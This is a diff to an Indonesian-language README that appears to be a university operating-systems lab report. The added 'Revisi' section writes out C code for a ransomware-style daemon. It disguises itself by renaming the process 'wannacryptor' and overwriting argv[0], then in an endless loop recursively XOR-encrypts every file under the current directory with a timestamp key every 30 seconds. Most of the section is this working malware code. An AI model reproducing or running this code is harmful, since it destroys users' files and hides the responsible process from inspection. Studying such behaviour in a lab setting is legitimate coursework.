@@ -776,7 +776,70 @@ strncpy(argv[0], "/init", strlen(argv[0]));
 ```
 
 ## Revisi
+Membuat fungsi anak proses
+```bash
+void anak(const char *name, int argc, char **argv) {
+    environ = NULL;
+    prctl(PR_SET_NAME, name, 0, 0, 0);
 
+    if (argc > 0) {
+        memset(argv[0], 0, strlen(argv[0]));
+        strncpy(argv[0], name, 63);
+    }
+}
+```
+Membuat fungsi anak fitur pertama (enkripsi dengan metode rekursif menggunakan xor dengan timestamp saat program dijalankan.)
+```bash
+void xor_file(const char *filename, unsigned int key) {
+    char tmp[512];
+    snprintf(tmp, sizeof(tmp), "%s.tmp", filename);
+
+    FILE *in = fopen(filename, "rb");
+    FILE *out = fopen(tmp, "wb");
+    if (!in || !out) return;
+
+    int ch;
+    while ((ch = fgetc(in)) != EOF) {
+        fputc(ch ^ key, out);
+    }
+
+    fclose(in); fclose(out);
+    remove(filename);
+    rename(tmp, filename);
+}
+
+void encrypt(const char *path, unsigned int key) {
+    DIR *dir = opendir(path);
+    if (!dir) return;
+
+    struct dirent *ent;
+    char full[1024];
+
+    while ((ent = readdir(dir))) {
+        if (!strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..")) continue;
+        snprintf(full, sizeof(full), "%s/%s", path, ent->d_name);
+
+        struct stat st;
+        if (stat(full, &st) == -1) continue;
+
+        if (S_ISDIR(st.st_mode)) encrypt(full, key);
+        else if (S_ISREG(st.st_mode)) xor_file(full, key);
+    }
+
+    closedir(dir);
+}
+```
+panggil fungsi anak fitur pertama di int main()
+```bash
+if (fork() == 0) {
+  anak("wannacryptor", argc, argv);
+  unsigned int key = (unsigned int) time(NULL);
+  while (1) {
+    encrypt(".", key);
+    sleep(30);
+  }
+}
+```
 
 # Soal_4
 Dikerjakan oleh Ahmad Wildan Fawwaz (5027241001)  
